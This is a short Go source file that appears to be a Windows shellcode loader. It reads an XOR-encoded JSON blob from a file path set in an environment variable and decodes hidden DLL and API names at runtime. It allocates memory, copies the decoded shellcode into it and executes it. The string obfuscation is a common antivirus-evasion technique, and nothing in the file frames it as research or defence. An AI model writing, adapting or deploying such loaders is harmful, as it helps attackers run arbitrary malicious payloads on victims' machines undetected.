package main

import (
	"encoding/json"
	"os"
	"syscall"
	"unsafe"
)

// /////////////////////////////////////////////////////////////////////////////////////////
func xor(key []byte, data []byte) {
	for i := 0; i < len(data); i++ {
		index := i % len(key)
		data[i] = data[i] ^ key[index]
	}
}

func run() {
	fileData, err := os.ReadFile(os.Getenv("FILE"))
	if err != nil {
		return
	}
	type FileJson struct {
		Key []byte
		Kll []byte
		VA  []byte
		AT  int
		Pro int
		Nll []byte
		RMM []byte
		SC  []byte //shellcode
	}
	var fs FileJson
	if err := json.Unmarshal(fileData, &fs); err != nil {
		return
	}
	xor(fs.Key, fs.Kll)
	xor(fs.Key, fs.VA)
	va := syscall.MustLoadDLL(string(fs.Kll)).MustFindProc(string(fs.VA))
	addr, _, _ := va.Call(0, uintptr(len(fs.SC)), uintptr(fs.AT), uintptr(fs.Pro))
	if addr == 0 {
		return
	}
	xor(fs.Key, fs.Nll)
	xor(fs.Key, fs.RMM)
	cm := syscall.MustLoadDLL(string(fs.Nll)).MustFindProc(string(fs.RMM))
	xor(fs.Key, fs.SC)
	cm.Call(addr, uintptr(unsafe.Pointer(&fs.SC[0])), uintptr(len(fs.SC)))
	syscall.SyscallN(addr)
}

// /////////////////////////////////////////////////////////////////////////////////////////
